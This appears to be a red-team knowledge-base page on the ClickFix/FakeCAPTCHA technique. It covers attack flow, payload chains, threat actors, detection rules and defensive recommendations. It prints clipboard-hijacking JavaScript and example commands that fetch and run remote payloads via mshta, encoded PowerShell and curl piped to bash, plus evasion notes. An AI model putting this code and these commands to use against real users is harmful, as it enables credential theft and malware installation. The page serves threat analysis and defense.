# ClickFix / FakeCAPTCHA Execution

> **MITRE ATT&CK**: Execution > T1204.004 - User Execution: Malicious Copy and Paste
> **Platforms**: Windows, macOS, Linux
> **Required Privileges**: None (social engineering - user-driven execution)
> **OPSEC Risk**: Medium (user executes the payload themselves, bypassing many automated defenses)

## Strategic Overview

ClickFix is a social engineering technique that emerged in early 2024 and exploded in prevalence
through 2025-2026, accounting for 8% of all blocked attacks with a 517% surge in H1 2025. The
technique exploits users' impulse to "fix" a presented problem by tricking them into copying a
malicious command to their clipboard and executing it via the Windows Run dialog or terminal. The
critical innovation is that the **user themselves** executes the command using trusted OS
functionality -- from the EDR's perspective, `explorer.exe` spawns `powershell.exe`, which looks
like a normal user action. This bypasses email filtering, browser sandboxing, SmartScreen/MOTW
protections, and many EDR heuristics. Nation-state actors (Kimsuky, MuddyWater, APT28) and
cybercrime groups (Lumma Stealer, Interlock ransomware) have all adopted ClickFix, signaling
its crossover from experimental technique to mainstream TTP. MITRE formalized this as T1204.004
(Malicious Copy and Paste) in recognition of its operational significance.

---

## Technical Deep-Dive

### Attack Flow

```
Step 1: Victim visits compromised/attacker-controlled website
        -> Displays fake CAPTCHA, browser error, or update prompt

Step 2: JavaScript silently copies malicious command to clipboard
        -> document.execCommand('copy') or Clipboard API
        -> User sees no indication of clipboard manipulation

Step 3: Page instructs user to:
        1. Press Win+R (Run dialog)
        2. Press Ctrl+V (paste)
        3. Press Enter (execute)

Step 4: Multi-stage payload chain executes:
        explorer.exe -> mshta.exe -> PowerShell -> .NET loader -> final payload
```

### Clipboard Injection Mechanism

```javascript
// Simplified representation of the clipboard injection technique
// JavaScript runs when user clicks the fake "Verify" button

// Create hidden textarea, populate with malicious command, copy, remove
var textarea = document.createElement('textarea');
textarea.style.position = 'fixed';
textarea.style.opacity = '0';
textarea.value = 'mshta http://malicious-site[.]com/payload.hta';
document.body.appendChild(textarea);
textarea.select();
document.execCommand('copy');
document.body.removeChild(textarea);

// Modern variant using Clipboard API
navigator.clipboard.writeText('powershell -w hidden -ep bypass -enc BASE64PAYLOAD');

// The user sees only a fake CAPTCHA interface
// No visual indication that the clipboard has been modified
```

### Common Lure Types

```
# High-success lure presentations:
1. Fake Cloudflare Turnstile / reCAPTCHA ("Verify you are human")
2. Fake browser error messages ("This page can't be displayed")
3. Fake Windows Update screens (full-screen realistic animations)
4. Fake BSOD screens
5. Fake document/attachment error dialogs
6. Fake file-repair dialogs (FileFix variant)

# Platform-specific variants:
- Windows: Win+R -> Ctrl+V -> Enter (mshta/PowerShell payloads)
- macOS:   Terminal -> paste (curl | bash, AppleScript payloads)
- Linux:   Terminal -> paste (curl | bash payloads)
```

### Typical Payload Chains (Windows)

```
# Chain 1: mshta -> PowerShell -> .NET reflective load
mshta http://[hex-encoded-IP]/payload.hta
  -> HTA executes VBScript/JScript
  -> Launches PowerShell with encoded command
  -> Reflectively loads .NET assembly in memory

# Chain 2: PowerShell direct
powershell -w hidden -ep bypass -enc [Base64EncodedPayload]
  -> Decodes and executes in-memory
  -> Downloads second stage from C2

# Chain 3: Steganographic payload (advanced - observed Nov 2025)
mshta -> PowerShell -> downloads PNG image
  -> Extracts shellcode from PNG pixel data (red color channel)
  -> Packed with Donut for in-memory .NET assembly execution
  -> Final payload: LummaC2 / Rhadamanthys

# Chain 4: CrashFix variant (Jan 2026)
Malicious Chrome extension crashes browser
  -> Presents ClickFix-style "fix" dialog
  -> Deploys ModeloRAT (Python RAT with RC4-encrypted C2)
```

### macOS Variant

```bash
# macOS ClickFix instructs users to open Terminal and paste:
bash -c "$(curl -fsSL http://malicious-site[.]com/payload.sh)"

# Or Base64-decoded AppleScript payloads:
echo "BASE64_ENCODED_APPLESCRIPT" | base64 -d | osascript

# AppleScript harvests:
# - Browser data (cookies, saved passwords)
# - Cryptocurrency wallet files
# - Personal documents
```

### Automation Frameworks

```
# IClickFix (WordPress-targeting framework)
# - Compromised 3,800+ WordPress sites across 82 countries
# - Injects malicious JS replacing page content with fake CAPTCHA
# - Uses YOURLS-based Traffic Distribution System (TDS)
# - Distributes NetSupport RAT, Emmenhtal Loader, XFiles Stealer

# ClearFake
# - Infected 9,300+ sites via fake reCAPTCHA/Turnstile prompts
# - Uses Web3/blockchain smart contracts for resilient infrastructure

# ClickFix Builders (underground market)
# - Pre-built landing page generators
# - Sold on forums for less technical operators
```

### Known Threat Actors

| Actor | Attribution | Campaign |
|-------|-------------|----------|
| Lumma Stealer operators | Cybercrime | Most frequently distributed malware via ClickFix |
| Interlock ransomware | Cybercrime | DaVita healthcare attack (2.7M patient records) |
| TA427 (Kimsuky) | North Korea | Espionage via ClickFix lures |
| TA450 (MuddyWater) | Iran | Targeted ClickFix campaigns |
| TA422 (APT28) | Russia | Adopted ClickFix tactics |
| UNK_RemoteRogue | Russia-linked | ClickFix malware deployment |
| G1052 (Contagious Interview) | North Korea | Job-interview social engineering |
| KongTuke | Cybercrime | CrashFix variant with ModeloRAT |

---

## Detection & Evasion

### What Defenders See

- `explorer.exe` -> `powershell.exe` or `explorer.exe` -> `mshta.exe` process chains from Run dialog
- `mshta.exe` making outbound HTTP connections (especially hex-encoded URLs)
- PowerShell with `-enc`, `-w hidden`, `-ep bypass` flags spawned from `explorer.exe`
- Clipboard API usage on pages with CAPTCHA-like elements (browser telemetry)
- Connections to newly registered domains following mshta/PowerShell execution

### Detection Rules

```
# Splunk detection: "Windows PowerShell FakeCAPTCHA Clipboard Execution"
# Detection ID: d81d4d3d-76b5-4f21-ab51-b17d5164c106

# Sigma-style detection logic:
# Parent process: explorer.exe (Run dialog origin)
# Child process: powershell.exe OR mshta.exe OR cmd.exe
# Command line contains: -enc OR -encoded OR hidden OR bypass OR http

# MITRE Data Sources:
# - Command Execution
# - File Creation
# - Network Connection Creation
# - Process Creation
```

### Evasion Techniques

- User-driven execution creates legitimate-looking process tree (`explorer.exe` parent)
- Payload constructed client-side bypasses email gateway and browser download scanning
- mshta.exe is a signed Microsoft LOLBIN, trusted by many application whitelisting policies
- Hex-encoded URLs evade pattern matching on well-known C2 domains
- Steganographic payloads in PNG images bypass content inspection
- Blockchain-based TDS infrastructure (ClearFake) resists takedowns

### Defensive Recommendations

```
# Endpoint hardening:
1. PowerShell Constrained Language Mode -- blocks .NET, COM, Win32 API calls
2. Execution Policy set to AllSigned or Restricted
3. AppLocker/WDAC rules to prevent mshta.exe for non-admin users
4. Disable mshta.exe via Software Restriction Policies where not needed

# Network controls:
5. Strict egress filtering -- restrict outbound to required protocols/ports
6. Network intrusion prevention for known ClickFix C2 patterns

# Browser security:
7. StopFix browser extension (github.com/naxonez/StopFix) detects malicious clipboard content
8. Push Security browser-based detection for malicious copy-paste operations
9. Enterprise browser policies to detect/block clipboard manipulation

# User education:
10. Legitimate CAPTCHAs NEVER ask users to open Run dialog or Terminal
11. Awareness campaigns about the Win+R -> Ctrl+V attack pattern
12. Simulated ClickFix phishing exercises
```

---

## Cross-References

- **Phishing Payloads** (02-initial-access/phishing-payloads.md) -- ClickFix lures often delivered via phishing emails
- **M365 Initial Access** (02-initial-access/office365-initial-access.md) -- SharePoint-hosted ClickFix pages
- **LOLBins** (03-execution/lolbins.md) -- mshta.exe is a key LOLBIN in ClickFix chains
- **Scripting Engines** (03-execution/scripting-engines.md) -- HTA/VBScript/JScript execution in payload chains
- **PowerShell Execution** (03-execution/powershell-execution.md) -- PowerShell cradles as ClickFix payloads
- **AV/EDR Evasion** (06-defense-evasion/av-edr-evasion.md) -- ClickFix bypasses multiple EDR detection layers

---

## References

- MITRE ATT&CK T1204.004: https://attack.mitre.org/techniques/T1204/004/
- Microsoft: Think before you Click(Fix): https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/
- Proofpoint: State-Sponsored Actors Try ClickFix: https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix
- Unit 42: Preventing the ClickFix Attack Vector: https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/
- Sekoia: IClickFix WordPress Framework: https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/
- Splunk: Unveiling Fake CAPTCHA ClickFix Attacks: https://www.splunk.com/en_us/blog/security/unveiling-fake-captcha-clickfix-attacks.html
- Huntress: ClickFix Gets Creative - Malware Buried in Images: https://www.huntress.com/blog/clickfix-malware-buried-in-images
- StopFix Browser Extension: https://github.com/naxonez/StopFix
